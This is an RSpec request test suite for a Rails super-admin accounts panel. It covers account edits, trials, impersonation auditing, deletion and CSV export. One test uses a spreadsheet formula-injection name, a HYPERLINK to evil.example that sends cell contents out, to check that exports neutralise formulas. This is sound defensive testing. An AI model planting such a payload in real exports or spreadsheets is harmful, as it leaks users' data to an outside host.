require 'rails_helper'

RSpec.describe 'Super Admin accounts API', locale: :en, type: :request do
  include ActiveJob::TestHelper

  let!(:super_admin) { create(:super_admin) }
  let!(:account) { create(:account) }

  def admin_request_locale
    ENV.fetch('DEFAULT_LOCALE', I18n.default_locale)
  end

  describe 'GET /super_admin/accounts' do
    context 'when it is an unauthenticated user' do
      it 'returns unauthorized' do
        get '/super_admin/accounts'
        expect(response).to have_http_status(:redirect)
      end
    end

    context 'when it is an authenticated user' do
      it 'shows the list of accounts' do
        sign_in(super_admin, scope: :super_admin)
        get '/super_admin/accounts'
        expect(response).to have_http_status(:success)
        expect(response.body).to include('Создать аккаунт')
        expect(response.body).to include(account.name)
      end
    end
  end

  describe 'GET /super_admin/accounts/new' do
    it 'renders the new workspace form for a super admin' do
      sign_in(super_admin, scope: :super_admin)

      get '/super_admin/accounts/new'

      expect(response).to have_http_status(:success)
      expect(response.body).to include('Outbound emails today')
    end
  end

  describe 'POST /super_admin/accounts' do
    it 'creates an account when the limit counter exclusion field is blank' do
      sign_in(super_admin, scope: :super_admin)
      created_name = "Created account with blank exclusions #{account.id}"

      expect do
        post '/super_admin/accounts', params: {
          account: {
            name: created_name,
            locale: account.locale,
            status: account.status,
            limit_counter_excluded_user_ids_raw: ''
          }
        }
      end.to change(Account, :count).by(1)

      created_account = Account.find_by!(name: created_name)
      expect(response).to redirect_to(super_admin_account_path(created_account))

      get response.location

      expect(response).to have_http_status(:success)
      expect(created_account.reload.custom_attributes).not_to have_key('limit_counter_excluded_user_ids')
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/reset_cache' do
    before do
      create(:label, account: account)
      create(:inbox, account: account)
      create(:team, account: account)
    end

    context 'when it is an unauthenticated user' do
      it 'returns unauthorized' do
        post "/super_admin/accounts/#{account.id}/reset_cache"
        expect(response).to have_http_status(:redirect)
      end
    end

    context 'when it is an authenticated user' do
      it 'shows the list of accounts' do
        expect(account.cache_keys.keys).to contain_exactly(:inbox, :label, :team, :'crm/stage')
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/reset_cache"
        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.cache_reset', locale: admin_request_locale))

        expect(account.reload.cache_keys.values).to all(match(/\A[0-9a-f-]{36}\z/))
      end
    end
  end

  describe 'PATCH /super_admin/accounts/{account_id}' do
    context 'when it is an authenticated user' do
      it 'normalizes numeric limit overrides and clears blank values' do
        account.update!(limits: { 'agents' => 4, 'captain_tokens' => 500 })
        sign_in(super_admin, scope: :super_admin)

        patch "/super_admin/accounts/#{account.id}", params: {
          account: {
            name: account.name,
            locale: account.locale,
            status: account.status,
            limits: {
              agents: '12',
              conversations: '0',
              captain_tokens: ''
            }
          }
        }

        expect(response).to have_http_status(:redirect)
        expect(account.reload.limits).to eq({ 'agents' => 12, 'conversations' => 0 })
      end

      it 'stores excluded user ids for limit counters as normalized integers' do
        account.update!(custom_attributes: { 'existing_workspace_setting' => 'preserve' })
        sign_in(super_admin, scope: :super_admin)

        patch "/super_admin/accounts/#{account.id}", params: {
          account: {
            name: account.name,
            locale: account.locale,
            status: account.status,
            limit_counter_excluded_user_ids_raw: "12, 15\nabc 19"
          }
        }

        expect(response).to have_http_status(:redirect)
        expect(account.reload.custom_attributes).to include(
          'limit_counter_excluded_user_ids' => [12, 15, 19],
          'existing_workspace_setting' => 'preserve'
        )
      end

      it 'persists checked and unchecked account features from the form' do
        account.disable_features!('crm', 'scheduling')
        sign_in(super_admin, scope: :super_admin)

        patch "/super_admin/accounts/#{account.id}", params: {
          account: {
            name: account.name,
            locale: account.locale,
            status: account.status
          },
          enabled_features: {
            feature_crm: '1',
            feature_scheduling: '0'
          }
        }

        expect(response).to have_http_status(:redirect)
        expect(account.reload.feature_enabled?('crm')).to be(true)
        expect(account.feature_enabled?('scheduling')).to be(false)
      end

      it 'preserves hidden feature flags when saving visible features' do
        account.enable_features!('inbox_view')
        sign_in(super_admin, scope: :super_admin)

        patch "/super_admin/accounts/#{account.id}", params: {
          account: {
            name: account.name,
            locale: account.locale,
            status: account.status
          },
          enabled_features: {
            feature_crm: '1',
            feature_scheduling: '0'
          }
        }

        expect(response).to have_http_status(:redirect)
        expect(account.reload.feature_enabled?('inbox_view')).to be(true)
      end

      it 'does not copy existing account attributes when creating with an id param' do
        account.enable_features!('inbox_view')
        account.update!(custom_attributes: { 'existing_workspace_setting' => 'keep on source' })
        sign_in(super_admin, scope: :super_admin)

        created_name = "Created account #{account.id}"
        expect do
          post '/super_admin/accounts', params: {
            id: account.id,
            account: {
              name: created_name,
              locale: account.locale,
              status: account.status,
              limits: {
                agents: '12',
                conversations: '0',
                captain_tokens: ''
              },
              limit_counter_excluded_user_ids_raw: "12, 15\nabc 19"
            },
            enabled_features: {
              feature_crm: '1'
            }
          }
        end.to change(Account, :count).by(1)

        created_account = Account.find_by!(name: created_name)
        expect(response).to redirect_to(super_admin_account_path(created_account))
        expect(created_account.limits).to eq({ 'agents' => 12, 'conversations' => 0 })
        expect(created_account.custom_attributes).to eq(
          'limit_counter_excluded_user_ids' => [12, 15, 19]
        )
        expect(created_account.feature_enabled?('inbox_view')).to be(false)
        expect(created_account.feature_enabled?('crm')).to be(true)

        get response.location

        expect(response).to have_http_status(:success)
      end

      it 'renders a toggle for every visible account feature' do
        sign_in(super_admin, scope: :super_admin)
        get "/super_admin/accounts/#{account.id}/edit"

        expect(response).to have_http_status(:success)

        visible_features = SuperAdmin::AccountFeaturesHelper.filtered_features(account.all_features)
        visible_features.each_key do |feature_key, _display_name|
          expect(response.body).to include(%(name="enabled_features[feature_#{feature_key}]"))
        end
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/reset_captain_responses_usage' do
    context 'when it is an authenticated user' do
      it 'resets the captain responses usage counter' do
        account.update!(custom_attributes: account.custom_attributes.merge('captain_responses_usage' => 12))
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/reset_captain_responses_usage"

        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.response_usage_reset', locale: admin_request_locale))
        expect(account.reload.custom_attributes['captain_responses_usage']).to eq(0)
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/reset_captain_tokens_usage' do
    context 'when it is an authenticated user' do
      it 'resets the captain tokens usage counter' do
        account.update!(custom_attributes: account.custom_attributes.merge('captain_tokens_usage' => 1200))
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/reset_captain_tokens_usage"

        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.token_usage_reset', locale: admin_request_locale))
        expect(account.reload.custom_attributes['captain_tokens_usage']).to eq(0)
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/reset_email_usage' do
    context 'when it is an authenticated user' do
      it 'resets the outbound email counter for today' do
        account.increment_email_sent_count
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/reset_email_usage"

        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.email_usage_reset', locale: admin_request_locale))
        expect(account.emails_sent_today).to eq(0)
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/extend_trial' do
    context 'when authenticated as super admin' do
      it 'extends active trial by 3 days' do
        account.activate_trial!(3)
        account.update!(custom_attributes: account.custom_attributes.merge('trial_expires_at' => 1.day.from_now.iso8601))
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/extend_trial"

        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.extend_success', locale: admin_request_locale))
        account.reload
        expect(account.trial?).to be(true)
        expect(account.trial_expires_at).to be > 3.days.from_now
      end

      it 'activates trial for 3 days only when starting one is requested explicitly' do
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/extend_trial", params: { start: true }

        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.extend_success', locale: admin_request_locale))
        account.reload
        expect(account.trial?).to be(true)
        expect(account.trial_active?).to be(true)
        expect(account.custom_attributes['trial_snapshot']).to be_present
      end

      it 'writes the extension to the audit log' do
        account.activate_trial!(3)
        account.update!(custom_attributes: account.custom_attributes.merge('trial_expires_at' => 1.day.from_now.iso8601))
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/extend_trial"

        expect(Audited::Audit.where(auditable_id: account.id, action: 'extend_trial')).to exist
      end

      it 'does not turn an account that is not on a trial into one by a plain extend' do
        account.update!(custom_attributes: { 'plan_type' => 'growth' })
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/extend_trial"

        expect(flash[:alert]).to eq(I18n.t('super_admin.accounts.flashes.not_trial', locale: admin_request_locale))
        expect(account.reload.custom_attributes['plan_type']).to eq('growth')
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/expire_trial' do
    context 'when authenticated as super admin' do
      it 'marks trial as expired' do
        account.activate_trial!(3)
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/expire_trial"

        expect(response).to have_http_status(:redirect)
        expect(flash[:notice]).to eq(I18n.t('super_admin.accounts.flashes.expire_success', locale: admin_request_locale))
        account.reload
        expect(account.trial?).to be(true)
        expect(account.trial_expired?).to be(true)
      end

      it 'leaves a paid account alone instead of downgrading it' do
        account.update!(custom_attributes: { 'plan_type' => 'growth' }, limits: { 'agents' => 10 })
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/expire_trial"

        expect(flash[:alert]).to eq(I18n.t('super_admin.accounts.flashes.expire_requires_managed', locale: admin_request_locale))
        account.reload
        expect(account.custom_attributes['plan_type']).to eq('growth')
        expect(account.limits['agents']).to eq(10)
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/impersonate' do
    context 'when authenticated as super admin' do
      it 'redirects to SSO impersonation URL of account administrator' do
        user = create(:user, account: account, role: :administrator)
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/impersonate"

        expect(response).to have_http_status(:redirect)
        expect(response.redirect_url).to include('/app/login')
        expect(response.redirect_url).to include('impersonation=true')
        expect(response.redirect_url).to include(CGI.escape(user.email))
      end

      it 'records who entered which account in the audit log' do
        user = create(:user, account: account, role: :administrator)
        sign_in(super_admin, scope: :super_admin)

        expect { post "/super_admin/accounts/#{account.id}/impersonate" }.to change(Audited::Audit, :count).by(1)

        audit = Audited::Audit.order(:id).last
        expect(audit).to have_attributes(action: 'impersonate', auditable_id: account.id, user_id: super_admin.id)
        expect(audit.audited_changes).to include('impersonated_user_id' => user.id)
      end

      it 'enters the account as the requested member instead of the first administrator' do
        create(:user, account: account, role: :administrator)
        agent = create(:user, account: account, role: :agent)
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/impersonate", params: { user_id: agent.id }

        expect(response).to have_http_status(:redirect)
        expect(response.redirect_url).to include(CGI.escape(agent.email))
        audit = Audited::Audit.order(:id).last
        expect(audit).to have_attributes(action: 'impersonate', auditable_id: account.id, user_id: super_admin.id)
        expect(audit.audited_changes).to include('impersonated_user_id' => agent.id)
      end

      it 'refuses a requested user who is not a member of the account' do
        create(:user, account: account, role: :administrator)
        outsider = create(:user, account: create(:account), role: :administrator)
        sign_in(super_admin, scope: :super_admin)

        expect do
          post "/super_admin/accounts/#{account.id}/impersonate", params: { user_id: outsider.id }
        end.not_to change(Audited::Audit, :count)

        expect(response).to have_http_status(:redirect)
        expect(response.redirect_url).not_to include('impersonation=true')
        expect(flash[:alert]).to eq(I18n.t('super_admin.accounts.flashes.no_users_to_impersonate', locale: admin_request_locale))
      end

      it 'does not mint a one-time login token just by opening the account page' do
        create(:user, account: account, role: :administrator)
        sign_in(super_admin, scope: :super_admin)
        allow_any_instance_of(User).to receive(:generate_sso_auth_token).and_call_original # rubocop:disable RSpec/AnyInstance

        get "/super_admin/accounts/#{account.id}"

        expect(response).to have_http_status(:success)
        expect(response.body).to include("/super_admin/accounts/#{account.id}/impersonate")
        expect(response.body).not_to include('sso_auth_token')
      end

      it 'redirects with an alert when account has no users' do
        sign_in(super_admin, scope: :super_admin)

        post "/super_admin/accounts/#{account.id}/impersonate"

        expect(response).to have_http_status(:redirect)
        expect(flash[:alert]).to eq(I18n.t('super_admin.accounts.flashes.no_users_to_impersonate', locale: admin_request_locale))
      end
    end
  end

  describe 'POST /super_admin/accounts/{account_id}/cleanup_storage' do
    it 'does not allow a one-step cleanup without preview and confirmation' do
      sign_in(super_admin, scope: :super_admin)

      expect do
        post "/super_admin/accounts/#{account.id}/cleanup_storage", params: { months: 6 }
      end.not_to change(Audited::Audit, :count)

      expect(response).to have_http_status(:not_found)
    end
  end

  describe 'GET /super_admin/accounts/export' do
    context 'when authenticated as super admin' do
      it 'exports clinic registry as CSV with UTF-8 BOM and headers' do
        sign_in(super_admin, scope: :super_admin)

        get '/super_admin/accounts/export'

        expect(response).to have_http_status(:success)
        expect(response.headers['Content-Type']).to include('text/csv')
        expect(response.headers['Content-Disposition']).to include('attachment')
        expect(response.headers['Content-Disposition']).to include('onelink-accounts-')
        expect(response.body).to start_with("\uFEFF")
        rows = CSV.parse(response.body.delete_prefix("\uFEFF"), headers: true)
        headers = I18n.t('super_admin.accounts.csv.headers', locale: admin_request_locale)
        expect(rows.headers).to eq(headers)
        expect(rows.pluck(headers.second)).to include(account.name)
      end
    end
  end

  describe 'GET /super_admin/accounts/export with hostile account names' do
    it 'stores formula-looking names as plain text' do
      account.update!(name: '=HYPERLINK("http://evil.example/?"&A1,"open")')
      other = create(:account, name: '@SUM(1+1)')
      sign_in(super_admin, scope: :super_admin)

      get '/super_admin/accounts/export'

      rows = CSV.parse(response.body.delete_prefix("\uFEFF"), headers: true)
      names = rows.pluck('Название')
      expect(names).to include("'=HYPERLINK(\"http://evil.example/?\"&A1,\"open\")", "'@SUM(1+1)")
      expect(names.grep(/\A[=+\-@]/)).to be_empty
      expect(other).to be_persisted
    end

    it 'keeps ordinary names untouched' do
      account.update!(name: 'Клиника Север')
      sign_in(super_admin, scope: :super_admin)

      get '/super_admin/accounts/export'

      expect(CSV.parse(response.body.delete_prefix("\uFEFF"), headers: true).pluck('Название')).to include('Клиника Север')
    end
  end

  describe 'Account storage and smart filters' do
    it 'returns storage breakdown structure' do
      breakdown = account.storage_breakdown
      expect(breakdown).to include(:audio, :images, :videos, :documents, :captain, :other, :total)
    end

    it 'provides smart collection filters for tariffs and trial' do
      expect(AccountDashboard::COLLECTION_FILTERS.keys).to include(
        :active, :suspended, :recent, :starter, :growth, :advanced, :enterprise,
        :trial_active, :trial_expired, :storage_high, :marked_for_deletion
      )

      account.update!(custom_attributes: { 'plan_type' => 'starter' })
      expect(AccountDashboard::COLLECTION_FILTERS[:starter].call(Account.all)).to include(account)
      expect(AccountDashboard::COLLECTION_FILTERS[:growth].call(Account.all)).not_to include(account)
    end
  end

  describe 'DELETE /super_admin/accounts/{account_id}' do
    context 'when it is an unauthenticated user' do
      it 'returns unauthorized' do
        delete "/super_admin/accounts/#{account.id}"
        expect(response).to have_http_status(:redirect)
      end
    end

    context 'when it is an authenticated user' do
      it 'Deletes the account' do
        total_accounts = Account.count
        sign_in(super_admin, scope: :super_admin)

        perform_enqueued_jobs(only: DeleteObjectJob) do
          delete "/super_admin/accounts/#{account.id}"
        end

        expect(Account.count).to eq(total_accounts - 1)
      end
    end
  end
end
